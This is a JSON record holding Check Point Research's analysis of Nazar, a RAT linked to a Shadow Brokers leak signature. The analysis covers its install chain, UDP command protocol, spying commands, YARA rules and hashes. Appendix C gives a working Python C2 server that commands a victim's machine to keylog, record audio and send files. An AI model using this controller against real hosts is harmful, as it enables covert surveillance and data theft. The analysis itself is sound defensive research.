{
    "id": "7c47d72a-5521-4eb8-8351-94485ee01894",
    "created_at": "2022-10-25T16:48:19.56821Z",
    "updated_at": "2025-03-27T02:16:25.66892Z",
    "deleted_at": null,
    "sha1_hash": "8f5591c1ec9f6b2911112c53dc551374a00b66c3",
    "title": "",
    "authors": "",
    "file_creation_date": "2020-05-06T06:31:35Z",
    "file_modification_date": "2020-05-06T06:31:35Z",
    "file_size": 1933794,
    "plain_text": "# Nazar: Spirits of the Past\n\n**[research.checkpoint.com/2020/nazar-spirits-of-the-past](https://research.checkpoint.com/2020/nazar-spirits-of-the-past/)**\n\nMay 5, 2020\n\n## Introduction\n\n\nMay 5, 2020\n\n\nThose were some of the words that the Equation Group (NSA) operators left in the records\ndocumenting their attacks against target systems, and which were later leaked by the Shadow\nBrokers. The plethora of information exposed in the fifth and last leak by the Shadow Brokers,\ncalled “Lost in Translation”, and the following consequences that took shape in WannaCry and\nNotPetya among other things, makes this a changing point in the game of cyber security as we\nknow it.\n\n[Recently, security researcher Juan Andres Guerrero-Saade revealed a previously misidentified](https://www.epicturla.com/blog/the-lost-nazar)\nand unknown threat group, called Nazar, which was part of the last leak by the Shadow Brokers.\nIn this research, we will expand upon the analysis done by Juan and another which was written\n[by Maciej Kotowicz, and will provide an in-depth analysis of each of the Nazar components. But](https://blog.malwarelab.pl/posts/nazar_eyservice/)\nthe real question is, do those new revelations add a missing piece to the puzzle, or do they show\nus how much of the puzzle we are missing?\n\n## Prior Knowledge\n\nWhile the “Lost in Translation” leak by the Shadow Brokers brought infamous exploits such as\n_EternalBlue into the limelight, it contained many more valuable components that showed some of_\nthe possible precautions taken by the Equation Group operators before launching an attack.\n\n\n-----\n\nA screenshot from the original post by the Shadow Brokers\n\nFor example, among the leaked files was one called “drv_list.txt“, which included a list of driver\nnames and corresponding remarks that were sent back to the operators if the drivers were found\non the target system. Naturally, the list contained many drivers that could detect the presence of\nan anti-virus product or a security solution (ourselves included):\n\nDrivers mentioned in “drv_list.txt”\n\nBut even more curious were the names of malicious drivers in this list, which if found could\nindicate that the target system has already been compromised by another attacker, and would\nthen warn the operators to “pull back”. Another pivotal component in the Equation Group’s\narsenal that is in charge of such checks is called “Territorial Dispute”, or “TeDi”.\n\n\n-----\n\nTerritorial Dispute, as seen in the leaked sources\n\nSimilar to a scan conducted by a security product, “TeDi” consists of 45 signatures that are used\nto search the target system for registry keys or filenames associated with other threat groups. But\nwe can assume that the end purpose in this case, unlike that of a security scan, is to make sure\nthat Equation Group’s operations are not disrupted and that their own tools are not detected by\nother adversaries (or “other peeps”, as they are called in “TeDi”) monitoring the same system.\n\nCode snippet from TeDi’s leaked sources\n\nIn certain cases, this also guarantees that the Equation Group themselves do not disrupt the\nongoing operations of “friendly” threat groups, and do not attack the same target.\n\n[Extensive research work has been done by CrySys Labs in 2018 to try and map each of the 45](https://www.crysys.hu/publications/files/tedi/ukatemicrysys_territorialdispute.pdf)\nsignatures to the respective threat group it is meant to detect since no names were included in\n“TeDi” itself.\n\n\n-----\n\nExamples for signatures found on TeDi’s leaked sources\n\nDespite the relatively scarce amount of information it contains, security researchers often revisit\n“TeDi” in an attempt to get a better understanding of threat groups that the Equation Group had\nvisibility to back then, as some of which are still (to this day) unknown to the public.\n\nSecurity researcher Juan Andres Guerrero-Saade has shown that the 37th signature in “TeDi”\nwhich looks for a file called “Godown.dll” points to what might be an Iranian threat group he\ndubbed “Nazar”, rather than a Chinese one as initially thought in the CrySys Lab report.\n\nSIG37, the signature to detect “Nazar” by looking for “godown.dll”\n\nThe beauty of the “TeDi” project is perhaps in its minimalism: the small number of signatures it\ncontained gave the Equation Group the capability of detecting the activity of notorious threat\ngroups that have eluded detection and managed to remain in the shadows for years: Turla, Duqu,\nDark Hotel, and the list goes on. This is the result of what we can only estimate as years of\nintelligence and research work on the Equation Group’s part. Equipped with this knowledge we\nset out to find more about the mysterious newly discovered player included in this watchlist:\nNazar.\n\n## Execution Flow\n\nNazar’s activity is believed to have started somewhere around 2008, meaning that the group was\nactive for at least four years, as the latest samples were created in 2012.\n\nThe CrySys Labs report pointed to a file possibly related to the 37th signature, which turned out to\nbe an anti-virus signature database from 2015 that detected this unique Nazar artifact,\n“Godown.dll”. Surprisingly, the same signature contained names of the other artifacts that we\nhave seen being used by the Nazar malware (and will explain in detail in the following sections),\nmeaning that some security companies were already fully aware of this malicious activity back\nthen, prior to the “TeDi” leak:\n\n\n-----\n\nAn anti-virus signature that was detecting Nazar\n\nThe initial binary that is executed in Nazar’s flow is `gpUpdates.exe . It is a Self-Extracting`\n[Archive (SFX) created by a program called “Zip 2 Secure EXE“. Upon execution,](https://www.chilkatsoft.com/ChilkatSfx.asp) `gpUpdates`\nwrites three files to disk: `Data.bin,` `info, and` `Distribute.exe . Then,` `gpUpdates.exe`\nwill start `Distribute.exe which operates as an installing component.`\n\n### Distribute.exe\n\nAt the start, `Distribute.exe will read the other two files that were dropped by` `gpUpdates :`\n```\ninfo and Data.bin . The Data.bin file is a binary blob that contains multiple PE files that\n\n```\nare concatenated in a sequence. The `info file is a very small file that contains a simple struct`\nwith the lengths of the PE files in `Data.bin .` `Distribute.exe will read` `Data.bin as a`\nstream, file by file, in the order of file lengths as shown in `info .`\n\nThe following table shows the files concatenated in `Data.bin against the lengths written in`\n```\ninfo .\n\n##### Data.bin (sequence of files) info (lengths)\n\n svchost.exe 213504\n\n Filesystem.dll 262219\n\n ViewScreen.dll 196608\n\n lame_enc.dll 162304\n\n hodll.dll 57344\n\n Godown.dll 32768\n\n```\nAfter the aforementioned files are dropped to the disk, `Distribute.exe will register 3 of the`\nDLL files to the registry, by using `regsvr32 .`\n\nShellExecuteA(0, \"open\", \"regsvr32.exe\", \"Godown.dll -s\", 0, 0);\n\nShellExecuteA(0, \"open\", \"regsvr32.exe\", \"ViewScreen.dll -s\", 0, 0);\n\nShellExecuteA(0, \"open\", \"regsvr32.exe\", \"Filesystem.dll -s\", 0, 0);\n\nAfterwards, it uses `CreateServiceA to add` `svchost.exe as a service named “EYService”,`\nand it will then start the service and exit. This service, as we will explain soon, is the core\ncomponent in the flow and is responsible for processing the commands sent by the attacker.\n\n\n-----\n\nNazar’s execution flow\n\n### svchost.exe / EYService\n\nThis service is the main component in the attack, and it orchestrates the entire modules dropped\nand loaded by Nazar. In a sense, the `EYService is only a marionette controlled by a puppeteer`\nthat sends commands to it. The communication protocol will be thoroughly explained in later parts\nof this blog post. As commonly seen in RAT-like components, this service mainly contains a list of\nsupported commands, and each of these commands is assigned with a function to handle it upon\na request from the attacker. The full list of commands is listed below.\n\nAs other components in Nazar, this module also does not demonstrate novel techniques or highquality of written code. In fact, this module, like the others, is mostly based on open-source\nlibraries that were commonly available at the time. To manage traffic and sniff packets, Nazar\n[uses Microolap‘s Packet Sniffer SDK. To record the victim’s microphone it uses “Lame” Mp3](http://microolap.com/)\n[encoding library. For keylogging it uses KeyDLL3. BMGLib is used to take screenshots, and even](https://www.codeguru.com/cpp/w-p/system/keyboard/article.php/c5699/Hooking-the-Keyboard.htm)\n[for shutting down the computer, it uses an open-source project – The ShutDown Alarm.](https://www.codeproject.com/Articles/7640/The-ShutDown-Alarm#pre964281)\n\n#### Communication\n\n\n-----\n\nWhen analyzing the networking component, the main thing we looked for was the IP of the\ncommand and control, since this could open up new paths, and perhaps recent attacks and\nsamples. Alas, leaving no stone unturned, we could not find such an IP, and it made sense due to\nhow Nazar is communicating.\n\nUpon execution of the service, it begins with setting up the packet sniffing. This is done by using\nthe Packet Sniffer SDK, in pretty much a textbook way. The main thread gets an outward-facing\n[network adapter and uses BPF to make sure only UDP packets are forwarded to the handler.](https://en.wikipedia.org/wiki/Berkeley_Packet_Filter)\n\nDWORD __stdcall main_thread(LPVOID lpThreadParameter)\n\n{\n\nHANDLE hMgr; // edi\n\nHANDLE hCfg; // esi\n\nHANDLE hFtr; // edi\n\nhMgr = MgrCreate();\n\nMgrInitialize(hMgr);\n\nhCfg = MgrGetFirstAdapterCfg(hMgr);\n\ndo\n\n{\n\nif ( !AdpCfgGetAccessibleState(hCfg) )\n\nbreak;\n\nhCfg = MgrGetNextAdapterCfg(hMgr, hCfg);\n\n}\n\nwhile ( hCfg );\n\nADP_struct = AdpCreate();\n\nAdpSetConfig(ADP_struct, hCfg);\n\nif ( !AdpOpenAdapter(ADP_struct) )\n\n{\n\nAdpGetConnectStatus(ADP_struct);\n\nMaxPacketSize = AdpCfgGetMaxPacketSize(hCfg);\n\nadapter_ip = AdpCfgGetIpA_wrapper(hCfg, 0);\n\n\n-----\n\nAdpCfgGetMACAddress(hCfg, &mac_address, 6);\n\nhFtr = BpfCreate();\n\nBpfAddCmd(hFtr, BPF_LD_B_ABS, 23u); // Get Protocol field value\n\nBpfAddJmp(hFtr, BPF_JMP_JEQ, IPPROTO_UDP, 0, 1);// Protocol == UDP\n\nBpfAddCmd(hFtr, BPF_RET, 0xFFFFFFFF);\n\nBpfAddCmd(hFtr, BPF_RET, 0);\n\nAdpSetUserFilter(ADP_struct, hFtr);\n\nAdpSetUserFilterActive(ADP_struct, 1);\n\nAdpSetOnPacketRecv(ADP_struct, on_packet_recv_handler, 0);\n\nAdpSetMacFilter(ADP_struct, 2);\n\nwhile ( 1 )\n\n{\n\nif ( stop_and_ping == 1 )\n\n{\n\nadapter_ip = AdpCfgGetIpA_wrapper(hCfg, 0);\n\nconnection_method(2);\n\nstop_and_ping = 0;\n\n}\n\nSleep(1000u);\n\n}\n\n}\n\nreturn 0;\n\n}\n\nWhenever a UDP packet arrives, its source IP is recorded to be used in the next response,\nwhether or not there will be a response. Then, the packet’s destination port will be checked, and\nin case it is 1234 the UDP data will be forwarded to the command dispatcher.\n\nint __cdecl commandMethodsWrapper(udp_t *udp_packet, int zero, char *src_ip, int ip_id)\n\n{\n\n\n-----\n\nint length; // edi\n\nlength = HIBYTE(udp_packet->length) - 8;\n\nntohs(udp_packet->src_port);\n\nif ( ntohs(udp_packet->dst_port) != 1234 )\n\nreturn 0;\n\ncommandDispatcher(&udp_packet[1], src_ip, ip_id, length);\n\nreturn 1;\n\n}\n\n**Types of responses**\n\nEach response will have its packet built from scratch, so it could be sent using PSSDK’s send\nmethods : `AdpAsyncSend/AdpSyncSend`\n\nThere are 3 types of responses:\n\nSend an ACK: With destination port `4000 and payload` `101;0000`\nSend computer information: With destination port `4000 and payload` `100;<Computer`\n```\n   Name>;<OS name>\n\n```\nSend a file: The content will be sent as UDP data, followed by another packet with `---`\n```\n   <size_of_file> The UDP destination port will be the little-endian value of the IP\n\n```\nidentification field in the request message. For example, If the server sent a packet (to\ndestination port 1234) with identification `0x3456,the malware will send its response with`\ndestination port `0x5634`\n\nTo make the options clearer, and to demonstrate how Nazar communicates, we have created a\npython script that can “play” the server controlled by the attacker, and communicate with the\nvictim. The script is available in Appendix C.\n\n\n-----\n\nA script we created to demonstrate how the server would communicate with Nazar\n\n#### Supported Commands\n\nAs we mentioned earlier, `svchost.exe, or the service named` `EYService, contains a list of`\nsupported commands. We analyzed two versions of the RAT and found slight differences. The\nentire list of supported commands, in addition to our analysis notes, are presented in the table\nbelow.\n\n\n-----\n\n##### Com‐ mand ID Description\n\n 311 Enable keylogger by loading the ‘hodll.dll’ library to memory and manually im‐ porting the ‘installhook’ function. The keystrokes are saved with the window name to ‘report.txt’. The written content is then sent to the server. The keylog‐ ger is based on common open-source libraries called “KeyDLL3” (by Anoop Thomas) and “KeyBoard Hooks” (by H. Joseph). Command 312 will disable the keylogger.\n\n 139 Shutdown the machine. The command is interacting with the Godown.dll component by spawning it based on its RCLSID and RIID. The Godown module was probably based on an open-source implementation called The ShutDown Alarm.\n\n 189 Start screen capturing. The function calls the benign ViewScreen.dll and instructs it to save screenshots in a PNG file named z.png . The file is then sent to the server. The module is based on a known open-source project named “BMGLib“, written by M. Scott Heiman. Command 313 will disable the screen capturing.\n\n 119 Responsible for recording audio using the victim’s Microphone. The recording is saved to music.mp3 and sent to the server. The implementation is based on an open-source project which uses a known open source library called “LAME MP3“. Command 315 will disable the voice recording.\n\n 199 List all drives in the PC (C:\\, D:\\, …) and save it to Drives.txt . The file is then sent to the server. This functionality exists as-is in Filesystem.dll but the newer variant of svchost.exe does not use the DLL, even though it is still dropped to the machine.\n\n 200 List all the files and folders in the system and saves it to Files.txt . The files and folder are separated with ;File; or ;Folder; . This functionality exists as-is in Filesystem.dll but the newer variant of svchost.exe does not use the DLL, even though it is still dropped to the machine.\n\n 201 Sends file content to the server.\n\n 209 Remove a file from the machine.\n\n 499 List program by enumerating the keys found in the following registry path: Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall . The program names are then saved to a file called Programs.txt and sent to the server.\n\n 599 List all the devices on the machine and save it to a file named ‘Devices.txt’ which is then sent to the server. The devices are separated with either ‘;Root;’ or ‘;Child;’.\n\n\n-----\n\n##### Com‐ mand ID Description\n\n 555 Sends Computer information: 100;Computer Name; OS Name back to the server in port 4000 .\n\n 315 Disable voice recording.\n\n 312 Disable keylogging.\n\n 313 Disable screen capturing.\n\n 666 Pretty much NOP. Will set a flag that is also set by 119 and 189 and will be unset when sending a file. However, it is never checked.\n\n 211 Registers Godown.dll using regsvr32 This command was included in svchost.exe versions from 2010 but was then removed, and the module registration moved to Distrbute.exe\n\n 212 Registers ViewScreen.dll using regsvr32 This command was included in svchost.exe versions from 2010 but was then removed, and the module registration moved to Distrbute.exe\n\n 213 Registers Filesystem.dll using regsvr32 This command was included in svchost.exe versions from 2010 but was then removed, and the module registration moved to Distrbute.exe\n\n### Godown.dll\n```\nGodown.dll is the DLL which is in the spotlight of SIG37, and the one that started this manhunt\n\n```\nafter the unknown malware. Before it was caught by law-abiding security analysts, one could\nimagine `Godown.dll to be the mastermind behind this whole operation, the component to`\ncontrol them all, some hidden gem, or an unseen rose. In reality, `Godown.dll is a tiny DLL with`\none and only goal – to shut down the computer. Believe us, we tried hard to find any hidden or\nmysterious functionality inside the binary, but nothing was there, except a shutdown command.\nThe reasons to take 5 lines of C code and place them in a DLL, put it in `Data.bin, drop it to the`\ndisk, register it as a COM DLL using `regsvr32 and then call it indirectly using GUID – are`\nbeyond our understanding. But well, it was good enough of a lead to revealing Nazar, and for that,\nwe should be thankful.\n\n### Filesystem.dll\n\nOut of all the modules used in this attack, `Filesystem.dll might be the only one whose code`\nwas actually written by the attackers themselves. The purpose of this module is to enumerate\ndrives, folders and files on the infected system and write the final results to two text files:\n```\nDrives.txt and Files.txt .\n\n```\nWe were able to get our hands on two versions of this module that were created a year apart,\nboth of which included PDB paths that mentioned a folder with the Persian name Khzer (or ���):\n\n\n-----\n\nUpon closer inspection, there are some differences between the two paths: One starts with the\n```\nC:\\\\ partition while the other starts with D:\\\\, one uses Khzer (uppercase) while the other\n\n```\nuses `khzer (lowercase), and so on. This might indicate that the two versions of the module`\nwere not compiled in the same environment, and is further strengthened by some of the included\nheaders’ paths, which show that Visual Studio was installed in two different locations:\n\nBut these are not the only differences between the two versions: while the `Filesystem.dll`\nmodule was dropped by all the known variants of `gpUpdates.exe, it was not always used in the`\nsame manner.\n\nFor example, versions of `svchost.exe dating back to 2010 have three commands that have`\nsince been omitted: “211”, “212”, and “213”. Those commands allow `svchost.exe to register`\nthe dropped DLL modules using `regsvr32, a functionality that was later migrated to`\n```\nDistribute.exe (as described in the Execution Flow section above).\n\n```\nAn omitted command presented in svchost.exe, as can be seen in Cutter\n\nThen, when a command is received by the C2 to collect the files and drives on the system, the\nFilesystem.dll module is called after it was registered:\n\n\n-----\n\nRegistering Filesystem.dll, as can be seen in Cutter\n\nOn the other hand, a more recent version of svchost.exe that was created in 2012 replicates the\nfile and drive lookup functionalities found in Filesystem.dll when receiving the “199” and “200”\ncommands from the C2, and performs the search itself. Therefore, even though it is still dropped\nin this case, it appears that the Filesystem.dll module is not used in the newer versions of Nazar:\n\nThe same functionality presented in both files as can be seen in the disassembly from Cutter\n\n### hodll.dll\n\nThe `hodll.dll module is responsible for recording the user’s keystrokes. It is done, as most`\nkeyloggers do, by setting a Windows hook for keyboard inputs. While there are many\nimplementations of keyloggers available, we believe that this implementation is based on one or\n\n\n-----\n\nmore open-source projects. Specifically, we believe that the code was taken from common open[source libraries called “KeyDLL3” (by Anoop Thomas) and “KeyBoard Hooks” (by H. Joseph) or](https://www.codeguru.com/cpp/w-p/system/keyboard/article.php/c5699/Hooking-the-Keyboard.htm)\nby a fork of these projects, as many are available. In fact, the samples of `hodll.dll we put our`\nhands on, looked like they were built from different layers of open source projects. In a way, it\nlooked like someone copied code from the internet, and then deleted it partially, and took other\ncode, and deleted it as well, and so on. The final result contained evolutionary pieces from\nmultiple layers of code.\n\n### ViewScreen.dll\n\n[This DLL is based on a known open-source project named “BMGLib” and it is used to take](https://github.com/death-droid/Rice-Video/blob/master/lib/BMGLib/BMGLib_DLL/BMGLibAPI.txt)\nscreenshots of the victim’s computer. No major changes, if any, were added to the original source,\nand this is yet another example of how the Nazar malware uses an entire library just for a small\ntask.\n\n## Conclusion\n\nIn this article, we tried to gather all the information we learned about Nazar since its recent\nexposure. We dived deep into each and every one of the components and tried to solve as many\nmysteries as possible. The leaked information by the Shadow Brokers taught us that the NSA\nknew about Nazar for many years, and thanks to other researchers, the community was able to\nstrikethrough another unknown malware family from the list of signatures in “TeDi”.\n\nMany of the signatures in “TeDi” described advanced and novel malware families, but this does\nnot appear to be the case with Nazar. As we have shown in the article, the quality of the code, as\nwell as the heavy usage of open source libraries, does not match the profile of a shrewd threat\nactor. And although we tried to cover everything, there are still many unanswered questions\nsurrounding those discoveries: What happened to the Nazar group, did they evolve into other\ngroups that are nowadays known under different names? Are they still active? Are there more\nsamples out there? With those questions and others on our minds, we cannot help but leave this\nopen-ended.\n\n## Appendix\n\n### Appendix A: Yara Rules\n\n[In his blog post, Juan published Yara rules to ease detection. The rules are well written and cover](https://raw.githubusercontent.com/juanandresgs/YARA/master/apt_ZZ_Sig37_NAZAR.yara)\nthe different components. We want to share some rules we created during our analysis, to add to\nthe existing rules.\n\nrule apt_nazar_svchost_commands\n\n{\n\nmeta:\n\n\n-----\n\ndescription = \"Detect Nazar's svchost based on supported commands\"\n\nauthor = \"Itay Cohen\"\n\ndate = \"2020-04-26\"\n\nreference = \"<https://www.epicturla.com/blog/the-lost-nazar>\"\n\nhash = \"2fe9b76496a9480273357b6d35c012809bfa3ae8976813a7f5f4959402e3fbb6\"\n\nhash = \"be624acab7dfe6282bbb32b41b10a98b6189ab3a8d9520e7447214a7e5c27728\"\n\nstrings:\n\n$str1 = { 33 31 34 00 36 36 36 00 33 31 33 00 }\n\n$str2 = { 33 31 32 00 33 31 35 00 35 35 35 00 }\n\n$str3 = { 39 39 39 00 35 39 39 00 34 39 39 00 }\n\n$str4 = { 32 30 39 00 32 30 31 00 32 30 30 00 }\n\n$str5 = { 31 39 39 00 31 31 39 00 31 38 39 00 31 33 39 00 33 31 31 00 }\n\ncondition:\n\n4 of them\n\n}\n\nrule apt_nazar_component_guids\n\n{\n\nmeta:\n\ndescription = \"Detect Nazar Components by COM Objects' GUID\"\n\nauthor = \"Itay Cohen\"\n\ndate = \"2020-04-27\"\n\nreference = \"<https://www.epicturla.com/blog/the-lost-nazar>\"\n\nhash = \"1110c3e34b6bbaadc5082fabbdd69f492f3b1480724b879a3df0035ff487fd6f\"\n\nhash = \"1afe00b54856628d760b711534779da16c69f542ddc1bb835816aa92ed556390\"\n\nhash = \"2caedd0b2ea45761332a530327f74ca5b1a71301270d1e2e670b7fa34b6f338e\"\n\nhash = \"2fe9b76496a9480273357b6d35c012809bfa3ae8976813a7f5f4959402e3fbb6\"\n\nhash = \"460eba344823766fe7c8f13b647b4d5d979ce4041dd5cb4a6d538783d96b2ef8\"\n\n\n-----\n\nhash = \"4d0ab3951df93589a874192569cac88f7107f595600e274f52e2b75f68593bca\"\n\nhash = \"75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3feeab7bd129c01ff6\"\n\nhash = \"8fb9a22b20a338d90c7ceb9424d079a61ca7ccb7f78ffb7d74d2f403ae9fbeec\"\n\nhash = \"967ac245e8429e3b725463a5c4c42fbdf98385ee6f25254e48b9492df21f2d0b\"\n\nhash = \"be624acab7dfe6282bbb32b41b10a98b6189ab3a8d9520e7447214a7e5c27728\"\n\nhash = \"d34a996826ea5a028f5b4713c797247913f036ca0063cc4c18d8b04736fa0b65\"\n\nhash = \"d9801b4da1dbc5264e83029abb93e800d3c9971c650ecc2df5f85bcc10c7bd61\"\n\nhash = \"eb705459c2b37fba5747c73ce4870497aa1d4de22c97aaea4af38cdc899b51d3\"\n\nstrings:\n\n$guid1_godown = { 98 B3 E5 F6 DF E3 6B 49 A2 AD C2 0F EA 30 DB FE } // Godown.dll IID\n\n$guid2_godown = { 31 4B CB DB B8 21 0F 4A BC 69 0C 3C E3 B6 6D 00 } // Godown.dll CLSID\n\n$guid3_godown = { AF 94 4E B6 6B D5 B4 48 B1 78 AF 07 23 E7 2A B5 } // probably Godown\n\n$guid4_filesystem = { 79 27 AB 37 34 F2 9D 4D B3 FB 59 A3 FA CB 8D 60 } // Filesystem.dll\nCLSID\n\n$guid6_filesystem = { 2D A1 2B 77 62 8A D3 4D B3 E8 92 DA 70 2E 6F 3D } // Filesystem.dll\nTypeLib IID\n\n$guid5_filesystem = { AB D3 13 CF 1C 6A E8 4A A3 74 DE D5 15 5D 6A 88 } // Filesystem.dll\n\ncondition:\n\nany of them\n\n}\n\n### Appendix B: Indication of Compromises\n\n\n-----\n\n##### File Sha-256\n\n gpUpdates.exe 4d0ab3951df93589a874192569‐ cac88f7107f595600e274f52e2b75f68593bca d34a996826ea5a028f5b4713c797247913f036ca0063c‐ c4c18d8b04736fa0b65 eb705459c2b37f‐ ba5747c73ce4870497aa1d4de22c97aaea4af38cdc899b51d3\n\n Data.bin d9801b4da1dbc5264e83029abb93e800d3c9971c650ecc2d‐ f5f85bcc10c7bd61 75e4d73252c753cd8e177820eb261cd72fecd7360cc8ec3fee‐ ab7bd129c01ff6 2caedd0b2ea45761332a530327f74‐ ca5b1a71301270d1e2e670b7fa34b6f338e\n\n Distribute.exe 839c3e6ba65e5d07a2e0c4dd4a2c0d7ae95a266431d‐ d3f8971b8a37d17b1ddf6 6b8ea9a156d495ec089710710ce3f4b1e19251c1d0e5b2c21bbee ab05e7b331f\n\n Filesystem.dll 1afe00b54856628d760b711534779da16c69f542ddc1b‐ b835816aa92ed556390 460eba344823766fe7c8f13b647b4d5d979ce4041d‐ d5cb4a6d538783d96b2ef8 1110c3e34b6bbaadc5082fabbdd69f492f3b1480724b879a3d‐ f0035ff487fd6f\n\n Hodll.dll 0c09fedc5c74f90883cd3256a181d03e4376d13676c1fe266db‐ d04778a929198\n\n Godown.dll 967ac245e8429e3b725463a5c4c42fbd‐ f98385ee6f25254e48b9492df21f2d0b 8fb9a22b20a338d90c7ceb9424d079a61ca7ccb7f78ff‐ b7d74d2f403ae9fbeec\n\n svchost.exe 2fe9b76496a9480273357b6d35c012809b‐ fa3ae8976813a7f5f4959402e3fbb6 be624acab7dfe6282bb‐ b32b41b10a98b6189ab3a8d9520e7447214a7e5c27728\n\n\n##### ViewScreen.dll (benign)\n\n\n##### 5a924dec60c623cf73f5b8505e11512ad85e62ac571a840ab0f‐ f48d4a04b60de\n\n\n##### pssdk41.sys (benign)\n\n\n##### 048208864c793a670159723b38c3ea1474ccc62e06b90833bd‐ f1683b8026e12f\n\n\n##### lame_enc.dll (benign)\n\n\n##### c84100d52c09703e32951444bd7ba4e22c5d41193e7420aacb‐ bc1f736f4c4e1f 0091e2101f00751c4020ef8e115cfe12a284c9abac‐ c886f549b40a62574a7510\n\n\n### Appendix C: Python Server\n\n\n-----\n\nfrom scapy.all import *\n\nimport struct\n\nimport socket\n\nimport hexdump\n\nimport argparse\n\nDST_PORT = 1234\n\n# 4000 is the usual port without sending files, but we use it for everything, because why not?\n\nSERVER_PORT = 4000\n\n# We want to make sure the ID has the little endian of it\n\nID = struct.unpack('>H',struct.pack('<H',4000))[0]\n\ndef get_response(sock, should_loop):\n\nstarted = False\n\ntotal_payload = b''\n\nwhile(should_loop or not started):\n\ntry:\n\npayload, client_address = sock.recvfrom(4096)\n\nexcept ConnectionResetError:\n\npayload, client_address = sock.recvfrom(4096)\n\ntotal_payload += payload\n\n# Good enough stop condition\n\nif (len(payload) >= 4\n\nand payload[:3] == b'---'\n\nand payload[4] >= ord('0')\n\nand payload[4] <= ord('9')):\n\nshould_loop = False\n\nstarted = True\n\n\n-----\n\nhexdump.hexdump(total_payload)\n\nMENU = \"\"\"Welcome to NAZAR. Please choose:\n\n999 - Get a ping from the victim.\n\n555 - Get information on the victim's machine.\n\n311 - Start keylogging (312 to disable).\n\n139 - Shutdown victim's machine.\n\n189 - Screenshot (313 to disable).\n\n119 - Record audio from Microphone (315 to disable).\n\n199 - List drives.\n\n200 - List recursivley from directory*.\n\n201 - Send a file*.\n\n209 - Remove file*.\n\n599 - List devices.\n\n- (append a path, use double-backslashes)\n\nquit to Quit,\n\nhelp for this menu.\n\n\"\"\"\n\ndef get_message():\n\nwhile True:\n\ncurr_message = input('> ').strip()\n\nif 'quit' in curr_message:\n\nreturn None\n\nif 'help' in curr_message:\n\nprint(MENU)\n\nelse:\n\nreturn curr_message\n\ndef get_sock():\n\n\n-----\n\nsock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n\nserver_address = '0.0.0.0'\n\nserver = (server_address, SERVER_PORT)\n\nsock.bind(server)\n\nreturn sock\n\ndef main(ip_addr):\n\nsock = get_sock()\n\nprint(MENU)\n\nmulti_packets = [\"200\",\"201\", \"119\", \"189\", \"311\", \"199\", \"599\"]\n\nsingle_packets = [\"999\", \"555\"]\n\nall_commands = single_packets + multi_packets\n\nwhile True:\n\ncurr_message = get_message()\n\nif not curr_message:\n\nbreak\n\n# Send message using scapy\n\n# Make sure the IP identification field is little endian of the port.\n\nsr1(\n\nIP(dst=ip_addr, id=ID)/\n\nUDP(sport=SERVER_PORT,dport=1234)/\n\nRaw(load=curr_message),\n\nverbose=0\n\n)\n\ncommand = curr_message[:3]\n\nif command not in all_commands:\n\ncontinue\n\nshould_loop = command in multi_packets\n\n\n-----\n\nget_response(sock, should_loop)\n\nif __name__ == '__main__':\n\nparser = argparse.ArgumentParser(description=\"victim's IP\")\n\nparser.add_argument('ip')\n\nargs = parser.parse_args()\n\nmain(args.ip)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        }
    ],
    "references": [
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2020/2020.05.05.Nazar_APT/Nazar_%20Spirits%20of%20the%20Past%20-%20Check%20Point%20Research.pdf"
    ],
    "report_names": [
        "Nazar_ Spirits of the Past - Check Point Research"
    ],
    "threat_actors": [
        {
            "id": "b740943a-da51-4133-855b-df29822531ea",
            "created_at": "2022-10-25T15:50:23.604126Z",
            "updated_at": "2025-03-27T02:00:55.505366Z",
            "deleted_at": null,
            "main_name": "Equation",
            "aliases": [
                "Equation"
            ],
            "source_name": "MITRE:Equation",
            "tools": null,
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "d4f7cf97-9c98-409c-8b95-b80d14c576a5",
            "created_at": "2022-10-25T16:07:24.561104Z",
            "updated_at": "2025-03-27T02:02:10.281202Z",
            "deleted_at": null,
            "main_name": "Shadow Brokers",
            "aliases": [],
            "source_name": "ETDA:Shadow Brokers",
            "tools": [],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "bf773c52-830b-46e3-aa61-58c82eb323ee",
            "created_at": "2023-01-06T13:46:39.135077Z",
            "updated_at": "2025-03-27T02:00:03.004808Z",
            "deleted_at": null,
            "main_name": "Nazar",
            "aliases": [
                "SIG37"
            ],
            "source_name": "MISPGALAXY:Nazar",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f3b19931-3751-4ece-a235-15b397951dc2",
            "created_at": "2022-10-25T16:07:23.889537Z",
            "updated_at": "2025-03-27T02:02:10.015565Z",
            "deleted_at": null,
            "main_name": "Nazar",
            "aliases": [
                "SIG37"
            ],
            "source_name": "ETDA:Nazar",
            "tools": [
                "Distribute.exe",
                "EYService",
                "GpUpdates.exe",
                "Microolap Packet Sniffer",
                "TCPDUMP for Windows"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "08623296-52be-4977-8622-50efda44e9cc",
            "created_at": "2023-01-06T13:46:38.549387Z",
            "updated_at": "2025-03-27T02:00:02.859535Z",
            "deleted_at": null,
            "main_name": "Equation Group",
            "aliases": [
                "Tilded Team",
                "EQGRP",
                "G0020"
            ],
            "source_name": "MISPGALAXY:Equation Group",
            "tools": [
                "EquationLaser",
                "EquationDrug",
                "DoubleFantasy",
                "TripleFantasy",
                "GrayFish"
            ],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
